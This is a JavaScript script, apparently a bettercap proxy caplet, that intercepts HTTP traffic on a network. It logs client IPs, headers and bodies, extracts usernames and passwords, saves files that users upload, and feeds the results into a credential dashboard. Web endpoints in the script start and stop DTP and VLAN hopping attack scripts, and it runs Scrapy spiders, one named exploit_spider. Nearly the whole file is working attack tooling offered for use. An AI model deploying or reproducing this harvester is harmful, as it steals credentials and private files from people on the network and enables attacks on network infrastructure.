const exec = require('child_process').exec;
const fs = require('fs').promises; // Use promises for async file operations
const path = require('path');
const process = require('process');

// Determine the base directory based on the platform
const baseDir = process.platform === 'win32' ? 'C:\\ProgramData\\bettercap' : '/usr/local/share/bettercap';

// Define paths using path.join() for platform independence
const capturedDataDir = path.join(baseDir, 'captured-data');
const capturedHtmlPath = path.join(baseDir, 'ui', 'captured.html');
const dtpAttackPath = path.join(baseDir, 'caplets', 'bk-aio', 'dtp_attack.py');
const vlanAttackPath = path.join(baseDir, 'caplets', 'bk-aio', 'vlan_hopping.py');
const capturedDataSpiderPath = path.join(baseDir, 'caplets', 'bk-aio', 'aio_scrapy', 'spiders', 'captured_data_spider.py');
const exploitSpiderPath = path.join(baseDir, 'caplets', 'bk-aio', 'aio_scrapy', 'spiders', 'exploit_spider.py');
const scrapySettingsPath = path.join(baseDir, 'caplets', 'bk-aio', 'aio_scrapy', 'settings.py');
const aioCapPath = path.join(baseDir, 'caplets', 'bk-aio', 'AIO.cap');
const aioJsPath = path.join(baseDir, 'caplets', 'bk-aio', 'AIO.js');

let lastLogTime = 0; // Timestamp of the last log message
const logInterval = 10000; // Log interval in milliseconds (e.g., 10 seconds)

let dtpAttackProcess = null;
let vlanAttackProcess = null;

function logMessage(message, level = 'INFO') {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] [${level}] ${message}`); // Enhanced logging with timestamp
}

async function writeToFile(filename, data, append = true) {
    const flag = append ? 'a' : 'w';
    const filePath = path.join(capturedDataDir, filename);
    try {
        await fs.writeFile(filePath, data + "\n", { flag: flag });
    } catch (error) {
        logMessage("Error writing to file: " + error.message, 'ERROR');
    }
}

async function writeRequestData(req) {
    const data = `IP: ${req.Client.IP}\n` +
                 `Headers:\n${req.Headers}\n` +
                 `Body:\n${req.Body}\n` +
                 "---------------------\n";
    await writeToFile("captured_data.txt", data);
}

function runScrapy() {
    const scrapyPath = path.join(baseDir, 'venv', 'bin', 'scrapy'); // Adjust for Windows if necessary
    const spiderPath = capturedDataSpiderPath; // Already defined above
    const scrapyCmd = `${scrapyPath} crawl captured_data_spider -a spider_path="${spiderPath}" -a captured_data_dir="${capturedDataDir}"`;

    exec(scrapyCmd, (error, stdout, stderr) => {
        if (error) {
            logMessage("Error running Scrapy: " + error.message, 'ERROR');
        } else {
            logMessage("Scrapy Spider executed successfully.");
            logMessage("Scrapy output: " + stdout);
            appendToHtml();
        }
    });
}

async function appendToHtml() {
    try {
        let html = await fs.readFile(capturedHtmlPath, 'utf8');
        const insertPosition = html.lastIndexOf('</body>');
        
        const newContent = `
        <div id="captured-data">
            <h2>Captured Credentials</h2>
            <ul id="credentials"></ul>
            <h2>Uploaded Files</h2>
            <ul id="uploads"></ul>
        </div>
        <script>
        function loadCapturedData() {
 fetch('/captured-data/processed_credentials.txt')
                .then(response => response.text())
                .then(data => {
                    document.getElementById('credentials').innerHTML = data.split('\\n')
                        .filter(cred => cred.trim())
                        .map (cred => \`<li>\${cred}</li>\`)
                        .join('');
                });

            fetch('/captured-data/file_uploads.txt')
                .then(response => response.text())
                .then(data => {
                    document.getElementById('uploads').innerHTML = data.split('\\n')
                        .filter(upload => upload.trim())
                        .map(upload => {
                            var [ip, file] = upload.split(' | File: ');
                            return \`<li>\${ip} - <a href="/captured-data/uploads/\${file}" target="_blank">\${file}</a></li>\`;
                        })
                        .join('');
                });
        }

        // Load data immediately
        loadCapturedData();

        // Refresh data every 30 seconds
        setInterval(loadCapturedData, 30000);
        </script>
        `;

        html = html.slice(0, insertPosition) + newContent + html.slice(insertPosition);
        await writeToFile('captured.html', html, false);
    } catch (error) {
        logMessage("Error appending to HTML: " + error.message, 'ERROR');
    }
}

function isAttackRunning(attackType) {
    return attackType === "dtp" ? dtpAttackProcess !== null : vlanAttackProcess !== null;
}

function modifyResponse(res, message) {
    if (res) {
        res.Body = message;
    } else {
        logMessage("Response object is null.", 'ERROR');
    }
}

async function onRequest(req, res) {
    if (!req || !res) {
        logMessage("Request or response object is null.", 'ERROR');
        return;
    }

    const ip = req.Client.IP;
    const headers = req.Headers.replace(/\r\n$/g, "").split("\r\n");
    const credentials = {};

    // Handle Start Attack Requests
    if (req.Path === "/start_attack") {
        const attackType = req.Query.type;

        if (attackType === "dtp" && !isAttackRunning(attackType)) {
            dtpAttackProcess = exec(`python ${dtpAttackPath}`, (error, stdout, stderr) => {
                if (error) {
                    logMessage("Error starting DTP attack: " + error.message, 'ERROR');
                    modifyResponse(res, "Failed to start DTP attack.");
                } else {
                    logMessage("DTP attack started.");
                    modifyResponse(res, "DTP attack started.");
                }
            });
        } else if (attackType === "vlan" && !isAttackRunning(attackType)) {
            vlanAttackProcess = exec(`python ${vlanAttackPath}`, (error, stdout, stderr) => {
                if (error) {
                    logMessage("Error starting VLAN hopping attack: " + error.message, 'ERROR');
                    modifyResponse(res, "Failed to start VLAN hopping attack.");
                } else {
                    logMessage("VLAN hopping attack started.");
                    modifyResponse(res, "VLAN hopping attack started.");
                }
            });
        } else {
            modifyResponse(res, "Attack already running.");
        }
        return; // Exit the function after handling the request
    }

    // Handle Stop Attack Requests
    if (req.Path === "/stop_attack") {
        const attackType = req.Query.type;

        if (attackType === "dtp" && dtpAttackProcess) {
            dtpAttackProcess.kill();
            dtpAttackProcess = null;
            logMessage("DTP attack stopped.");
            modifyResponse(res, "DTP attack stopped.");
        } else if (attackType === "vlan" && vlanAttackProcess) {
            vlanAttackProcess.kill();
            vlanAttackProcess = null;
            logMessage("VLAN hopping attack stopped.");
            modifyResponse(res, "VLAN hopping attack stopped.");
        } else {
            modifyResponse(res, "Attack not running.");
        }
        return; // Exit the function after handling the request
    }

    await writeRequestData(req);

    // Credential capture
    for (const header of headers) {
        if (header.includes("username=")) {
            credentials.username = header.replace(/.*username=/, "").split('&')[0];
        }
        if (header.includes("password=")) {
            credentials.password = header.replace(/.*password=/, "").split('&')[0];
        }
    }

    if (credentials.username && credentials.password) {
        const currentTime = Date.now();
        if (currentTime - lastLogTime > logInterval) {
            logMessage(`[+] Credentials Captured - IP: ${ip} | Username: ${credentials.username} | Password: ${credentials.password}`);
            await writeToFile("credentials.txt", `IP: ${ip} | Username: ${credentials.username} | Password: ${credentials.password}`);
 lastLogTime = currentTime; // Update the last log time
        }
    }

    // File upload detection
    if (req.Headers.includes("multipart/form-data")) {
        const boundary = headers.find(header => header.startsWith("Content-Type:")).split(';')[1].trim().split('=')[1];
        const parts = req.Body.split("--" + boundary).slice(1, -1);

        for (const part of parts) {
            const contentDisposition = part.match(/Content-Disposition: (.*?)(\r\n|\r|\n)/);
            if (contentDisposition) {
                const filenameMatch = contentDisposition[1].match(/filename="(.*?)"/);
                const fileTypeMatch = contentDisposition[1].match(/name="(.*?)"/);
                const fileData = part.split("\r\n\r\n")[1].trim();

                if (filenameMatch) {
                    const filename = filenameMatch[1];
                    const currentTime = Date.now();
                    if (currentTime - lastLogTime > logInterval) {
                        if (filename.includes("image")) {
                            logMessage(`[*] Image Upload Detected: ${filename} from ${ip}`);
                            modifyResponse(res, "Thank you for uploading an image!");
                        } else if (filename.includes("video")) {
                            logMessage(`[*] Video Upload Detected: ${filename} from ${ip}`);
                            modifyResponse(res, "Thank you for uploading a video!");
                        } else {
                            logMessage(`[*] File Upload Detected: ${filename} from ${ip}`);
                        }
                        await writeToFile(`uploads/${filename}`, fileData, false);
                        await writeToFile("file_uploads.txt", `IP: ${ip} | File: ${filename}`);
                        lastLogTime = currentTime; // Update the last log time
                    }
                }
            }
        }
    }

    // Run Scrapy after capturing data
    runScrapy();
}

function onResponse(req, res) {
    logMessage("Response from IP: " + req.Client.IP);
    // You can add more response processing here if needed
}

// Graceful shutdown on interrupt
process.on('SIGINT', () => {
    if (dtpAttackProcess) {
        dtpAttackProcess.kill();
    }
    if (vlanAttackProcess) {
        vlanAttackProcess.kill();
    }
    logMessage("Received interrupt. Stopping attacks and exiting...");
    process.exit(0);
});